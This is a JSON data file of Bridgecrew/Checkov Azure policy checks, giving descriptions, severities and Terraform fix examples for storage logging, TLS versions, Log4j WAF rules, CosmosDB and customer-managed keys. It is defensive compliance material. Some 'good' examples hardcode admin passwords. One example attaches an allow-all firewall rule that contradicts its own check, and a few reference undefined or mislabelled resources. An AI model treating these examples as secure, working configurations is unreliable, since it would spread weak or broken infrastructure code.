    "CKV2_AZURE_20": {
        "url": "https://docs.bridgecrew.io/docs/ensure-storage-logging-is-enabled-for-table-service-for-read-requests",
        "description": "Azure storage account logging for tables is disabled\nDescription\nThe Storage Table storage is a service that stores structure NoSQL data in the cloud, providing a key/attribute store with a schema less design. Storage Logging happens server- side and allows details for both successful and failed requests to be recorded in the storage account. These logs allow users to see the details of read, write, and delete operations against the tables. Storage Logging log entries contain the following information about individual requests: Timing information such as start time, end-to-end latency, and server latency, authentication details , concurrency information and the sizes of the request and response messages.\nStorage Analytics logs contain detailed information about successful and failed requests to a storage service. This information can be used to monitor individual requests and to diagnose issues with a storage service. Requests are logged on a best-effort basis.\nFix - Buildtime \nTerraform\n\nResource: azurerm_resource_group, azurerm_log_analytics_workspace, azurerm_storage_account, azurerm_log_analytics_storage_insights, azurerm_storage_table\n\nGoresource \"azurerm_resource_group\" \"blobExample_ok\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_log_analytics_workspace\" \"blobExample_ok\" {\n  name                = \"exampleworkspace\"\n  location            = azurerm_resource_group.blobExample_ok.location\n  resource_group_name = azurerm_resource_group.blobExample_ok.name\n  sku                 = \"PerGB2018\"\n  retention_in_days   = 30\n}\n\nresource \"azurerm_storage_account\" \"blobExample_ok\" {\n  name                     = \"examplestoracc\"\n  resource_group_name      = azurerm_resource_group.blobExample_ok.name\n  location                 = azurerm_resource_group.blobExample_ok.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"LRS\"\n}\n\nresource \"azurerm_log_analytics_storage_insights\" \"blobExample_ok\" {\n  name                = \"example-storageinsightconfig\"\n  resource_group_name = azurerm_resource_group.blobExample_ok.name\n  workspace_id        = azurerm_log_analytics_workspace.blobExample_ok.id\n\n  storage_account_id  = azurerm_storage_account.blobExample_ok.id\n  storage_account_key = azurerm_storage_account.blobExample_ok.primary_access_key\n  table_names = [\"myexampletable_ok\"]\n}\n\nresource \"azurerm_storage_table\" \"blobExample_ok\" {\n  name                   = \"myexampletable_ok\"\n  storage_account_name   = azurerm_storage_account.blobExample_ok.name\n  storage_container_name = azurerm_storage_container.blobExample_ok.name\n}\n",
        "severity": "LOW"
    },
    "CKV2_AZURE_9": {
        "url": "https://docs.bridgecrew.io/docs/ensure-virtual-machines-are-utilizing-managed-disks",
        "description": "Azure Virtual Machines are not utilizing managed disks\nDescription\nMigrate BLOB based VHD's to Managed Disks on Virtual Machines to exploit the default features of this configuration. The features include\n\nDefault Disk Encryption\nResilience as Microsoft will managed the disk storage and move around if\nunderlying hardware goes faulty\nReduction of costs over storage accounts\n\nManaged disks are by default encrypted on the underlying hardware so no additional encryption is required for basic protection, it is available if additional encryption is required. Managed disks are by design more resilient that storage accounts.\nFor ARM deployed Virtual Machines, Azure Adviser will at some point recommend moving VHD's to managed disks both from a security and cost management perspective.\nFix - Buildtime \nTerraform\n\nResource: azurerm_virtual_machine\n\nGoresource \"azurerm_virtual_machine\" \"virtual_machine_good\" {\n  name                  = \"my-vm\"\n  location              = \"location\"\n  resource_group_name   = \"group_name\"\n  network_interface_ids = [\"1234567\"]\n  vm_size               = \"Standard_DS1_v2\"\n\n  storage_image_reference {\n    publisher = \"Canonical\"\n    offer     = \"UbuntuServer\"\n    sku       = \"16.04-LTS\"\n    version   = \"latest\"\n  }\n  storage_os_disk {\n    name              = \"myosdisk1\"\n    caching           = \"ReadWrite\"\n    create_option     = \"FromImage\"\n    managed_disk_type = \"Standard_LRS\"\n  }\n  os_profile {\n    computer_name  = \"hostname\"\n    admin_username = \"testadmin\"\n    admin_password = \"Password1234!\"\n  }\n  os_profile_linux_config {\n    disable_password_authentication = false\n  }\n  tags = {\n    environment = \"staging\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_125": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-active-directory-is-used-for-service-fabric-authentication",
        "description": "Active Directory is not used for Service Fabric authentication \nDescription\nA Service Fabric cluster requires creating Azure Active Directory (AD) applications to control access to the cluster: one web application and one native application. After the applications are created, you will be required to assign users to read-only and admin roles.\nFix - Buildtime \nTerraform\n\nResource: azurerm_service_fabric_cluster\nArgument: azure_active_directory - (Optional) An azure_active_directory block as defined below.\n\nGoresource \"azurerm_service_fabric_cluster\" \"example\" {\n  ...\n  + azure_active_directory {\n  +     tenant_id = \"tenant\"\n  }\n  ...\n            }\n",
        "severity": "LOW"
    },
    "CKV2_AZURE_10": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-microsoft-antimalware-is-configured-to-automatically-updates-for-virtual-machines",
        "description": "Microsoft Antimalware is not configured to automatically update Virtual Machines\nDescription\nThis policy audits any Windows virtual machine not configured with automatic update of Microsoft Antimalware protection signatures.\nFix - Buildtime \nTerraform\n\nResource: azurerm_virtual_machine, azurerm_virtual_machine_extension\nArgument: virtual_machine_id (of  azurerm_virtual_machine_extension )\n\nGoresource \"azurerm_virtual_machine\" \"virtual_machine_good_1\" {\n  name                  = \"acctvm\"\n  location              = \"location\"\n  resource_group_name   = \"group\"\n  network_interface_ids = [\"id\"]\n  vm_size               = \"Standard_F2\"\n  storage_os_disk {\n    name          = \"myosdisk1\"\n    caching       = \"ReadWrite\"\n    create_option = \"FromImage\"\n  }\n}\n\n\nresource \"azurerm_virtual_machine_extension\" \"extension_good_1\" {\n  name                 = \"hostname\"\n+ virtual_machine_id   = azurerm_virtual_machine.virtual_machine_good_1.id\n  publisher            = \"Microsoft.Azure.Security\"\n  type                 = \"IaaSAntimalware\"\n  type_handler_version = \"2.0\"\n  auto_upgrade_minor_version = true\n}\n",
        "severity": "LOW"
    },
    "CKV2_AZURE_6": {
        "url": "https://docs.bridgecrew.io/docs/ensure-allow-access-to-azure-services-for-postgresql-database-server-is-disabled",
        "description": "PostgreSQL Database Server 'Allow access to Azure services' enabled \nDescription\nWhen 'Allow access to Azure services' settings is enabled, PostgreSQL Database server will accept connections from all Azure resources including other subscription resources as well. It is recommended to use firewall rules or VNET rules to allow access from specific network ranges or virtual networks.\nFix - Runtime\nIn Azure Console\n\nLogin to Azure console\nNavigate to 'Azure Database for PostgreSQL servers' dashboard\nSelect the reported PostgreSQL server\nGo to 'Connection security' under 'Settings'\nSelect 'No' for 'Allow access to Azure services' under 'Firewall rules'\nClick on 'Save'\n\nFix - Buildtime\nTerraform\nGoresource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_sql_server\" \"sql_server_good\" {\n  name                         = \"mysqlserver\"\n  resource_group_name          = azurerm_resource_group.example.name\n  location                     = \"West US\"\n  version                      = \"12.0\"\n  administrator_login          = \"4dm1n157r470r\"\n  administrator_login_password = \"4-v3ry-53cr37-p455w0rd\"\n}\n\nresource \"azurerm_sql_firewall_rule\" \"firewall_rule_good\" {\n  name                = \"FirewallRule1\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_sql_server.sql_server_good.name\n  start_ip_address    = \"10.0.17.62\"\n  end_ip_address      = \"10.0.17.62\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_133": {
        "url": "https://docs.bridgecrew.io/docs/ensure-front-door-waf-prevents-message-lookup-in-log4j2",
        "description": "Front Door WAF allows message lookup in Log4j2\nDescription\nUsing a vulnerable version of Apache Log4j library might enable attackers to exploit a Lookup mechanism that supports making requests using special syntax in a format string which can potentially lead to a risky code execution, data leakage and more.\nSet your Front Door Web Application Firewall (WAF) to prevent executing such mechanism using the rule definition below.\nAzure WAF has updated Default Rule Set (DRS) versions 1.0 and 1.1 with rule 944240 \u201cRemote Command Execution\u201d under Managed Rules to help in detecting and mitigating this vulnerability. This rule is already enabled by default in block mode for all existing WAF Default Rule Set configurations.\nLearn more around CVE-2021-44228\nFix - Buildtime \nTerraform\n\nResource: azurerm_frontdoor_firewall_policy\n\nGoresource \"azurerm_frontdoor_firewall_policy\" \"example\" {\n  name                = \"example\"\n  resource_group_name = \"example\"\n\n  managed_rule {\n    type    = \"Microsoft_DefaultRuleSet\"\n    version = \"1.1\"\n\n    override {\n      rule_group_name = \"JAVA\"\n\n      rule {\n        action  = \"Block\"\n        enabled = true\n        rule_id = \"944240\"\n      }\n    }\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_135": {
        "url": "https://docs.bridgecrew.io/docs/ensure-application-gateway-waf-prevents-message-lookup-in-log4j2",
        "description": "Application Gateway WAF allows message lookup in Log4j2\nDescription\nUsing a vulnerable version of Apache Log4j library might enable attackers to exploit a Lookup mechanism that supports making requests using special syntax in a format string which can potentially lead to a risky code execution, data leakage and more.\nSet your Application Gateway (WAF) to prevent executing such mechanism using the rule definition below.\nLearn more around CVE-2021-44228\nFix - Buildtime \nTerraform\n\nResource: azurerm_frontdoor_firewall_policy\n\nGoresource \"azurerm_web_application_firewall_policy\" \"example\" {\n  location            = \"germanywestcentral\"\n  name                = \"example\"\n  resource_group_name = \"example\"\n\n  managed_rules {\n    managed_rule_set {\n      type    = \"OWASP\"\n      version = \"3.1\"\n    }\n  }\n\n  policy_settings {}\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_52": {
        "url": "https://docs.bridgecrew.io/docs/ensure-mssql-is-using-the-latest-version-of-tls-encryption",
        "description": "MSSQL is not using the latest version of TLS encryption\nDescription\nThe Transport Layer Security (TLS) protocol secures transmission of data between servers and web browsers, over the Internet, using standard encryption technology. To follow security best practices and the latest PCI compliance standards, enable the latest version of TLS protocol (i.e. TLS 1.2) for all your MSSQL servers.\nFix - Buildtime \nTerraform\n\nResource: azurerm_mssql_server\nArgument:  minimum_tls_version\n\nGoresource \"azurerm_mssql_server\" \"examplea\" {\n   ...\n + minimum_tls_version           = \"1.2\"\n   ...\n }\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_53": {
        "url": "https://docs.bridgecrew.io/docs/ensure-public-network-access-enabled-is-set-to-false-for-mysql-servers",
        "description": "public network access enabled' is not set to 'False' for mySQL servers\nDescription\nBy disabling public network access and only allowing connections from trusted IP addresses or networks, you can help to mitigate these risks and ensure that only authorized users and systems are able to connect to the MySQL server. This can help to protect the server and its data from unauthorized access or attacks, and can help to maintain the confidentiality, integrity, and availability of the server and its resources.\nFix - Buildtime \nTerraform\n\nResource: azurerm_mysql_server\nArgument: public_network_access_enabled\n\nGoresource \"azurerm_mysql_server\" \"examplea\" {\n  ...\n+ public_network_access_enabled = false\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_54": {
        "url": "https://docs.bridgecrew.io/docs/ensure-mysql-is-using-the-latest-version-of-tls-encryption",
        "description": "MySQL is not using the latest version of TLS encryption\nDescription\nThe Transport Layer Security (TLS) protocol secures transmission of data between servers and web browsers, over the Internet, using standard encryption technology. To follow security best practices and the latest PCI compliance standards, enable the latest version of TLS protocol (i.e. TLS 1.2) for all your MySQL servers.\nFix - Buildtime \nTerraform\n\nResource: azurerm_mysql_server\nArgument:  ssl_minimal_tls_version_enforced\n\nGoresource \"azurerm_mysql_server\" \"examplea\" {\n   ...\n + ssl_minimal_tls_version_enforced  = \"TLS1_2\"\n            }\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_126": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-service-fabric-uses-available-three-levels-of-protection-available",
        "description": "Service Fabric does not use three levels of protection available\nDescription\nService Fabric provides three levels of protection (None, Sign and EncryptAndSign) for node-to-node communication using a primary cluster certificate. Set the protection level to ensure that all node-to-node messages are encrypted and digitally signed\nFix - Buildtime \nTerraform\n\nResource: azurerm_service_fabric_cluster\nArgument:  fabric_settings\n\nGoresource \"azurerm_service_fabric_cluster\" \"example\" {\n   ...\n+  fabric_settings {\n+    name = \"Security\"\n+    parameters = {\n+      name = \"ClusterProtectionLevel\"\n+      value = \"EncryptAndSign\"\n    }\n  }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_CUSTOM_1": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-resources-that-support-tags-have-tags",
        "description": "Azure resources that support tags do not have Tags\nDescription\nMany different types of Azure resources support tags. Tags allow you to add metadata to a resource to help identify ownership, perform cost / billing analysis, and to enrich a resource with other valuable information, such as descriptions and environment names. While there are many ways that tags can be used, we recommend you follow a tagging practice.\nView Microsoft's recommended tagging best practices here.\nsupported_resourcesazurerm_analysis_services_server\nazurerm_api_management\nazurerm_api_management_named_value\nazurerm_api_management_property\nazurerm_app_configuration\nazurerm_app_service\nazurerm_app_service_certificate\nazurerm_app_service_certificate_order\nazurerm_app_service_environment\nazurerm_app_service_managed_certificate\nazurerm_app_service_plan\nazurerm_app_service_slot\nazurerm_application_gateway\nazurerm_application_insights\nazurerm_application_insights_web_test\nazurerm_application_security_group\nazurerm_attestation_provider\nazurerm_automation_account\nazurerm_automation_dsc_configuration\nazurerm_automation_runbook\nazurerm_availability_set\nazurerm_backup_policy_vm\nazurerm_backup_protected_vm\nazurerm_bastion_host\nazurerm_batch_account\nazurerm_bot_channels_registration\nazurerm_bot_connection\nazurerm_bot_web_app\nazurerm_cdn_endpoint\nazurerm_cdn_profile\nazurerm_cognitive_account\nazurerm_communication_service\nazurerm_container_group\nazurerm_container_registry\nazurerm_container_registry_webhook\nazurerm_cosmosdb_account\nazurerm_custom_provider\nazurerm_dashboard\nazurerm_data_factory\nazurerm_data_lake_analytics_account',\nazurerm_data_lake_store\nazurerm_data_share_account\nazurerm_database_migration_project\nazurerm_database_migration_service\nazurerm_databox_edge_device\nazurerm_databricks_workspace\nazurerm_dedicated_hardware_security_module\nazurerm_dedicated_host\nazurerm_dedicated_host_group\nazurerm_dev_test_global_vm_shutdown_schedule\nazurerm_dev_test_lab\nazurerm_dev_test_linux_virtual_machine\nazurerm_dev_test_policy\nazurerm_dev_test_schedule\nazurerm_dev_test_virtual_network\nazurerm_dev_test_windows_virtual_machine\nazurerm_devspace_controller\nazurerm_digital_twins_instance\nazurerm_disk_access\nazurerm_disk_encryption_set\nazurerm_dns_a_record\nazurerm_dns_aaaa_record\nazurerm_dns_caa_record\nazurerm_dns_cname_record\nazurerm_dns_mx_record\nazurerm_dns_ns_record\nazurerm_dns_ptr_record\nazurerm_dns_srv_record\nazurerm_dns_txt_record\nazurerm_dns_zone\nazurerm_eventgrid_domain\nazurerm_eventgrid_system_topic\nazurerm_eventgrid_topic\nazurerm_eventhub_cluster\nazurerm_eventhub_namespace\nazurerm_express_route_circuit\nazurerm_express_route_gateway\nazurerm_express_route_port\nazurerm_firewall\nazurerm_firewall_policy',\nazurerm_frontdoor\nazurerm_frontdoor_firewall_policy\nazurerm_function_app\nazurerm_function_app_slot\nazurerm_hdinsight_hadoop_cluster\nazurerm_hdinsight_hbase_cluster\nazurerm_hdinsight_interactive_query_cluster\nazurerm_hdinsight_kafka_cluster\nazurerm_hdinsight_ml_services_cluster\nazurerm_hdinsight_rserver_cluster\nazurerm_hdinsight_spark_cluster\nazurerm_hdinsight_storm_cluster\nazurerm_healthcare_service\nazurerm_hpc_cache\nazurerm_image\nazurerm_integration_service_environment\nazurerm_iot_security_solution\nazurerm_iot_time_series_insights_gen2_environment\nazurerm_iot_time_series_insights_reference_data_set\nazurerm_iot_time_series_insights_standard_environment\nazurerm_iotcentral_application\nazurerm_iothub\nazurerm_iothub_dps\nazurerm_ip_group\nazurerm_key_vault\nazurerm_key_vault_certificate\nazurerm_key_vault_key\nazurerm_key_vault_secret\nazurerm_kubernetes_cluster\nazurerm_kubernetes_cluster_node_pool\nazurerm_kusto_cluster\nazurerm_lb\nazurerm_linux_virtual_machine\nazurerm_linux_virtual_machine_scale_set\nazurerm_local_network_gateway\nazurerm_log_analytics_cluster\nazurerm_log_analytics_linked_service\nazurerm_log_analytics_saved_search\nazurerm_log_analytics_solution\nazurerm_log_analytics_storage_insights\nazurerm_log_analytics_workspace\nazurerm_logic_app_integration_account\nazurerm_logic_app_workflow\nazurerm_machine_learning_workspace\nazurerm_maintenance_configuration\nazurerm_managed_application\nazurerm_managed_application_definition\nazurerm_managed_disk\nazurerm_management_group_template_deployment\nazurerm_maps_account\nazurerm_mariadb_server\nazurerm_media_live_event\nazurerm_media_services_account\nazurerm_media_streaming_endpoint\nazurerm_monitor_action_group\nazurerm_monitor_action_rule_action_group\nazurerm_monitor_action_rule_suppression\nazurerm_monitor_activity_log_alert\nazurerm_monitor_autoscale_setting\nazurerm_monitor_metric_alert\nazurerm_monitor_scheduled_query_rules_alert\nazurerm_monitor_scheduled_query_rules_log\nazurerm_monitor_smart_detector_alert_rule\nazurerm_mssql_database\nazurerm_mssql_elasticpool\nazurerm_mssql_server\nazurerm_mssql_virtual_machine\nazurerm_mysql_server\nazurerm_nat_gateway\nazurerm_netapp_account\nazurerm_netapp_pool\nazurerm_netapp_snapshot\nazurerm_netapp_volume\nazurerm_network_connection_monitor\nazurerm_network_ddos_protection_plan\nazurerm_network_interface\nazurerm_network_profile\nazurerm_network_security_group\nazurerm_network_watcher\nazurerm_notification_hub\nazurerm_notification_hub_namespace\nazurerm_orchestrated_virtual_machine_scale_set\nazurerm_point_to_site_vpn_gateway\nazurerm_postgresql_server\nazurerm_powerbi_embedded\nazurerm_private_dns_a_record\nazurerm_private_dns_aaaa_record\nazurerm_private_dns_cname_record\nazurerm_private_dns_mx_record\nazurerm_private_dns_ptr_record\nazurerm_private_dns_srv_record\nazurerm_private_dns_txt_record\nazurerm_private_dns_zone\nazurerm_private_dns_zone_virtual_network_link\nazurerm_private_endpoint\nazurerm_private_link_service\nazurerm_proximity_placement_group\nazurerm_public_ip\nazurerm_public_ip_prefix\nazurerm_purview_account\nazurerm_recovery_services_vault\nazurerm_redis_cache\nazurerm_redis_enterprise_cluster\nazurerm_relay_namespace\nazurerm_resource_group\nazurerm_resource_group_template_deployment\nazurerm_route_filter\nazurerm_route_table\nazurerm_search_service\nazurerm_security_center_automation\nazurerm_service_fabric_cluster\nazurerm_service_fabric_mesh_application\nazurerm_service_fabric_mesh_local_network\nazurerm_service_fabric_mesh_secret\nazurerm_service_fabric_mesh_secret_value\nazurerm_servicebus_namespace\nazurerm_shared_image\nazurerm_shared_image_gallery\nazurerm_shared_image_version\nazurerm_signalr_service\nazurerm_snapshot\nazurerm_spatial_anchors_account\nazurerm_spring_cloud_service\nazurerm_sql_database\nazurerm_sql_elasticpool\nazurerm_sql_failover_group\nazurerm_sql_server\nazurerm_ssh_public_key\nazurerm_stack_hci_cluster\nazurerm_storage_account\nazurerm_storage_sync\nazurerm_stream_analytics_job\nazurerm_subnet_service_endpoint_storage_policy\nazurerm_subscription\nazurerm_subscription_template_deployment\nazurerm_synapse_spark_pool\nazurerm_synapse_sql_pool\nazurerm_synapse_workspace\nazurerm_tenant_template_deployment\nazurerm_traffic_manager_profile\nazurerm_user_assigned_identity\nazurerm_virtual_desktop_application_group\nazurerm_virtual_desktop_host_pool\nazurerm_virtual_desktop_workspace\nazurerm_virtual_hub\nazurerm_virtual_hub_security_partner_provider\nazurerm_virtual_machine\nazurerm_virtual_machine_extension\nazurerm_virtual_machine_scale_set\nazurerm_virtual_network\nazurerm_virtual_network_gateway\nazurerm_virtual_network_gateway_connection\nazurerm_virtual_wan\nazurerm_vmware_private_cloud\nazurerm_vpn_gateway\nazurerm_vpn_server_configuration\nazurerm_vpn_site\nazurerm_web_application_firewall_policy\nazurerm_windows_virtual_machine\nazurerm_windows_virtual_machine_scale_set\n\nFix - Buildtime \nTerraform\nThe example below shows how to tag a security group in Terraform. The syntax is generally the same for any taggable resource type.\nGoresource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_managed_disk\" \"example\" {\n  name                 = \"acctestmd\"\n  location             = \"West US 2\"\n  resource_group_name  = azurerm_resource_group.example.name\n  storage_account_type = \"Standard_LRS\"\n  create_option        = \"Empty\"\n  disk_size_gb         = \"1\"\n\n+  tags = {\n+    environment = \"staging\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_43": {
        "url": "https://docs.bridgecrew.io/docs/ensure-storage-accounts-adhere-to-the-naming-rules",
        "description": "Storage Account name does not follow naming rules\nDescription\nAzure has the following rules for naming your storage account:\n\nNames must be between 3 and 24 characters long\nNames may contain numbers and lowercase letters only\nYour storage account name must be unique\n\nThis policy ensures that you have not provided an invalid name for your Storage Account.\nFix - Buildtime\nTerraform\nGoresource \"azurerm_storage_account\" \"camel_case\" {\n-  name  = \"this-Is-Wrong\"\n+  name  = \"thisisright\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_132": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_storage_4",
        "description": "CosmosDB account enables privileged escalation by not restricting management plane changes\nDescription\nIn 2019, Microsoft added a feature called Jupyter Notebook to Cosmos DB that lets customers visualize their data and create customized views. The feature was automatically turned on for all Cosmos DBs in February 2021. A series of misconfigurations in the notebook feature opened up a new attack vector - the notebook container allowed for a privilege escalation into other customer notebooks. As a result, an attacker could gain access to customers\u2019 Cosmos DB primary keys and other highly sensitive secrets such as the notebook blob storage access token.\nFor more details visit - https://msrc-blog.microsoft.com/2021/08/27/update-on-vulnerability-in-the-azure-cosmos-db-jupyter-notebook-feature/\nOne way to reduce risk is to prevent management plane changes for clients using key based authentication. CosmosDB access keys are mainly used by applications to access data in CosmosDB containers. It is rare for organizations to have use cases where the keys are used to make management changes. \nFix - Buildtime\nTerraform\n\nResource: azurerm_cosmosdb_account\nArgument:  access_key_metadata_writes_enabled\n\nGoresource \"azurerm_cosmosdb_account\" \"db\" {\n  name                = \"db\"\n  ...\n+ access_key_metadata_writes_enabled = false\n}\n\nARM Templates\n\nResource: encryptionOperation\nArgument: EnableEncryption\n\nGo{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2018-05-01/subscriptionDeploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n    ...\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.DocumentDB/databaseAccounts\",\n      \"apiVersion\": \"2018-07-01\",\n      \"name\": \"db\",\n      \"properties\": {\n        ...\n+       \"disableKeyBasedMetadataWriteAccess\": true,\n      }\n    }\n  ]\n}\n",
        "severity": "LOW"
    },
    "CKV2_AZURE_8": {
        "url": "https://docs.bridgecrew.io/docs/ensure-the-storage-container-storing-the-activity-logs-is-not-publicly-accessible",
        "description": "The storage container storing activity logs is publicly accessible\nDescription\nThe storage account container containing the activity log export should not be publicly accessible.\nAllowing public access to activity log content may aid an adversary in identifying weaknesses in the affected account's use or configuration.\nConfiguring container Access policy to private will remove access from the container for everyone except owners of the storage account. Access policy needs to be set explicitly in order to allow access to other desired users.\nFix - Buildtime \nTerraform\n\nResource: azurerm_storage_container, azurerm_storage_account, azurerm_monitor_activity_log_alert\nArgument: container_access_type (of azurerm_storage_container) \n\nGoresource \"azurerm_storage_container\" \"ok_container\" {\n  name                  = \"vhds\"\n  storage_account_name  = azurerm_storage_account.ok_account.name\n+ container_access_type = \"private\"\n}\n\nresource \"azurerm_storage_account\" \"ok_account\" {\n  name                     = \"examplesa\"\n  resource_group_name      = azurerm_resource_group.main.name\n  location                 = azurerm_resource_group.main.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"GRS\"\n}\n\nresource \"azurerm_monitor_activity_log_alert\" \"ok_monitor_activity_log_alert\" {\n  name                = \"example-activitylogalert\"\n  resource_group_name = azurerm_resource_group.main.name\n  scopes              = [azurerm_resource_group.main.id]\n  description         = \"This alert will monitor a specific storage account updates.\"\n\n  criteria {\n    resource_id    = azurerm_storage_account.ok_account.id\n    operation_name = \"Microsoft.Storage/storageAccounts/write\"\n    category       = \"Recommendation\"\n  }\n\n\n  action {\n    action_group_id = azurerm_monitor_action_group.main.id\n\n    webhook_properties = {\n      from = \"terraform\"\n    }\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV2_AZURE_19": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-synapse-workspaces-have-no-ip-firewall-rules-attached",
        "description": "Azure Synapse workspaces have IP firewall rules attached\nDescription\nIP firewall rules in Azure Synapse are used to control inbound and outbound network traffic to and from your workspace. By attaching IP firewall rules to your workspace, you can control which IP addresses or ranges have access to your workspace and what actions they can perform.\nHowever, attaching IP firewall rules to your workspace can also introduce potential security risks because it allows you to specify specific IP addresses or ranges that have access to your workspace. If an attacker is able to determine the IP address of your workspace, they could potentially gain access to it if the IP address is included in the firewall rules.\nFix - Buildtime \nTerraform\n\nResource: azurerm_synapse_firewall_rule, azurerm_resource_group, azurerm_synapse_workspace\nArgument: synapse_workspace_id (of azurerm_synapse_firewall_rule )\n\nGoresource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_synapse_workspace\" \"workspace_good\" {\n  name                                 = \"example\"\n  sql_administrator_login              = \"sqladminuser\"\n  sql_administrator_login_password     = \"[email\u00a0protected]!\"\n  managed_virtual_network_enabled      = true\n  tags = {\n    Env = \"production\"\n  }\n}\n\n\nresource \"azurerm_synapse_firewall_rule\" \"firewall_rule\" {\n  name                 = \"AllowAll\"\n  synapse_workspace_id = azurerm_synapse_workspace.workspace_bad.id\n  start_ip_address     = \"0.0.0.0\"\n  end_ip_address       = \"255.255.255.255\"\n}\n",
        "severity": "LOW"
    },
    "CKV2_AZURE_1": {
        "url": "https://docs.bridgecrew.io/docs/ensure-storage-for-critical-data-are-encrypted-with-customer-managed-key",
        "description": "Storage for critical data are not encrypted with Customer Managed Key \nDescription\nEnable sensitive data encryption at rest using Customer Managed Keys (CMKs) rather than Microsoft Managed keys. By default, data in the storage account is encrypted using Microsoft Managed Keys at rest. All Azure Storage resources are encrypted, including blobs, disks, files, queues, and tables. All object metadata is also encrypted. However, if you want to control and manage this encryption key yourself, you can specify a customer-managed key, that key is used to protect and control access to the key that encrypts your data. You can also choose to automatically update the key version used for Azure Storage encryption whenever a new version is available in the associated Key Vault.\nFix - Buildtime \nTerraform\n\nResource: azurerm_resource_group, azurerm_key_vault, azurerm_key_vault_access_policy, azurerm_key_vault_key, azurerm_storage_account, azurerm_storage_account_customer_managed_key\n\nGodata \"azurerm_client_config\" \"current\" {}\n\nresource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_key_vault\" \"example\" {\n  name                = \"examplekv\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  tenant_id           = data.azurerm_client_config.current.tenant_id\n  sku_name            = \"standard\"\n\n  purge_protection_enabled = true\n}\n\nresource \"azurerm_key_vault_access_policy\" \"client\" {\n  key_vault_id = azurerm_key_vault.example.id\n  tenant_id    = data.azurerm_client_config.current.tenant_id\n  object_id    = data.azurerm_client_config.current.object_id\n\n  key_permissions    = [\"get\", \"create\", \"delete\", \"list\", \"restore\", \"recover\", \"unwrapkey\", \"wrapkey\", \"purge\", \"encrypt\", \"decrypt\", \"sign\", \"verify\"]\n  secret_permissions = [\"get\"]\n}\n\nresource \"azurerm_key_vault_key\" \"example\" {\n  name         = \"tfex-key\"\n  key_vault_id = azurerm_key_vault.example.id\n  key_type     = \"RSA\"\n  key_size     = 2048\n  key_opts     = [\"decrypt\", \"encrypt\", \"sign\", \"unwrapKey\", \"verify\", \"wrapKey\"]\n\n  depends_on = [\n    azurerm_key_vault_access_policy.client\n  ]\n}\n\n\nresource \"azurerm_storage_account\" \"ok_storage_account\" {\n  name                     = \"examplestor\"\n  resource_group_name      = azurerm_resource_group.example.name\n  location                 = azurerm_resource_group.example.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"GRS\"\n\n  identity {\n    type = \"SystemAssigned\"\n  }\n}\n\n\nresource \"azurerm_storage_account_customer_managed_key\" \"ok_cmk\" {\n  storage_account_id = azurerm_storage_account.ok_storage_account.id\n  key_vault_id       = azurerm_key_vault.example.id\n  key_name           = azurerm_key_vault_key.example.name\n}\n",
        "severity": "HIGH"
    },
    "CKV2_AZURE_16": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-mysql-server-enables-customer-managed-key-for-encryption",
        "description": "MySQL server does not enable customer-managed key for encryption\nDescription\nUse customer-managed keys to manage the encryption at rest of your MySQL servers. By default, the data is encrypted at rest with service-managed keys, but customer-managed keys are commonly required to meet regulatory compliance standards. Customer-managed keys enable the data to be encrypted with an Azure Key Vault key created and owned by you. You have full control and responsibility for the key lifecycle, including rotation and management.\nFix - Buildtime \nTerraform\n\nResource: azurerm_resource_group,azurerm_key_vault,  azurerm_key_vault_access_policy, azurerm_key_vault_key, azurerm_mysql_server, azurerm_mysql_server_key\n\nGoresource \"azurerm_resource_group\" \"ok\" {\n  name     = \"ok-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_key_vault\" \"ok\" {\n  name                     = \"okkv\"\n  location                 = azurerm_resource_group.ok.location\n  resource_group_name      = azurerm_resource_group.ok.name\n  tenant_id                = data.azurerm_client_config.current.tenant_id\n  sku_name                 = \"premium\"\n  purge_protection_enabled = true\n}\n\nresource \"azurerm_key_vault_access_policy\" \"server\" {\n  key_vault_id       = azurerm_key_vault.ok.id\n  tenant_id          = data.azurerm_client_config.current.tenant_id\n  object_id          = azurerm_mysql_server.ok.identity.0.principal_id\n  key_permissions    = [\"get\", \"unwrapkey\", \"wrapkey\"]\n  secret_permissions = [\"get\"]\n}\n\nresource \"azurerm_key_vault_access_policy\" \"client\" {\n  key_vault_id       = azurerm_key_vault.ok.id\n  tenant_id          = data.azurerm_client_config.current.tenant_id\n  object_id          = data.azurerm_client_config.current.object_id\n  key_permissions    = [\"get\", \"create\", \"delete\", \"list\", \"restore\", \"recover\", \"unwrapkey\", \"wrapkey\", \"purge\", \"encrypt\", \"decrypt\", \"sign\", \"verify\"]\n  